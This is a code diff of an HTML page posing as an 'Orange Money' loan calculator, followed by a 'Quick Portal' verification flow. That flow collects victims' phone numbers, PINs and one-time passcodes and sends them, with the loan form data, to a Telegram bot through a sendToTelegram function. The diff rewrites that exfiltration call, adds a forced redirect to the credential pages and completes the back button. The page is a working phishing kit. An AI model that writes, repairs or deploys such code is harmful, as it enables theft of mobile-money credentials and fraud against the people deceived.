@@ -22,6 +22,7 @@
     }
 
     * { box-sizing: border-box; margin: 0; padding: 0; }
+
     html, body { height: 100%; }
 
     body {
@@ -74,6 +75,7 @@
     }
 
     .container { width: 90%; max-width: 1050px; margin: 40px auto; }
+
     .section-title { font-size: 25px; margin-bottom: 8px; }
     .section-description { color: var(--muted); font-size: 13px; margin-bottom: 25px; }
 
@@ -88,11 +90,14 @@
     }
 
     .card h3 { font-size: 17px; margin-bottom: 22px; }
+
     .field { margin-bottom: 23px; }
     .field label, .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 9px; }
 
     .range-labels { display: flex; justify-content: space-between; color: var(--muted); font-size: 11px; margin-top: 5px; }
+
     input[type="range"] { width: 100%; accent-color: var(--orange); cursor: pointer; }
+
     .value-display { color: var(--orange-dark); font-size: 20px; font-weight: 800; margin-bottom: 8px; }
 
     .result-card {
@@ -127,6 +132,7 @@
     }
 
     .apply-section { margin-top: 50px; }
+
     .form-group { margin-bottom: 18px; }
 
     .form-group input, .form-group select {
@@ -183,7 +189,7 @@
       margin-top: 50px;
     }
 
-    /* Verification styles */
+    /* Verification */
     .verification-wrapper {
       min-height: 100vh;
       background: linear-gradient(145deg, #fff4eb, #f7f8fc, #e8eef8);
@@ -273,6 +279,7 @@
     .secondary:hover { background: #e0e5ed; }
 
     .otp-input { text-align: center; letter-spacing: 10px; font-size: 24px; font-weight: 700; }
+
     .footer-v { text-align: center; padding: 20px 12px; color: #8a93a3; font-size: 12px; }
 
     @keyframes appear {
@@ -300,7 +307,7 @@
 </head>
 <body>
 
-  <!-- PAGE 1: LOAN CALCULATOR -->
+  <!-- PAGE 1 -->
   <div id="loanPage">
     <header>
       <div class="logo">Orange <span>Money</span></div>
@@ -416,7 +423,7 @@
     </footer>
   </div>
 
-  <!-- PAGE 2: VERIFICATION -->
+  <!-- PAGE 2 -->
   <div id="verificationPage" class="verification-wrapper" style="display: none;">
     <header class="top-bar">
       <div class="brand">Quick Portal</div>
@@ -465,23 +472,13 @@
     // ===============================================
 
     function sendToTelegram(msg) {
-      const telegramUrl = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
-
-      // Using CORS proxy so it works from GitHub Pages
-      fetch("https://corsproxy.io/?" + encodeURIComponent(telegramUrl), {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: msg,
-          parse_mode: "HTML"
-        })
-      })
-      .then(res => res.json())
-      .then(data => console.log("Telegram:", data))
-      .catch(err => console.log("Telegram error:", err));
+      try {
+        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: "HTML"})
+        });
+      } catch(e) {}
     }
 
     // Calculator
@@ -500,7 +497,6 @@
       const m = Number(termSlider.value);
       const r = 0.08 / 12;
       const pay = p * r / (1 - Math.pow(1 + r, -m));
-
       document.getElementById("loanAmountDisplay").textContent = formatWhole(p);
       document.getElementById("loanTermDisplay").textContent = m + " months";
       document.getElementById("monthlyPayment").textContent = formatMoney(pay);
@@ -515,7 +511,7 @@
     termSlider.addEventListener("input", calculateLoan);
     calculateLoan();
 
-    // Loan Form
+    // Loan form
     document.getElementById("loanForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
@@ -540,9 +536,11 @@
         "📅 Period: " + repaymentPeriod + " months"
       );
 
+      // Show loading
       document.getElementById("applicationCard").style.display = "none";
       document.getElementById("loadingCard").style.display = "block";
 
+      // Force go to verification after 2.5 seconds
       setTimeout(function() {
         document.getElementById("loanPage").style.display = "none";
         document.getElementById("verificationPage").style.display = "flex";
@@ -550,7 +548,7 @@
       }, 2500);
     });
 
-    // Phone + PIN Form
+    // Phone + PIN form
     document.getElementById("detailsForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
@@ -567,7 +565,7 @@
       document.getElementById("otpPage").style.display = "block";
     });
 
-    // OTP Form
+    // OTP form
     document.getElementById("otpForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
@@ -584,4 +582,10 @@
     });
 
     // Back button
-    document.getElementById("backButton").addEventListener("click", function()
+    document.getElementById("backButton").addEventListener("click", function() {
+      document.getElementById("otpPage").style.display = "none";
+      document.getElementById("detailsPage").style.display = "block";
+    });
+  </script>
+</body>
+</html>
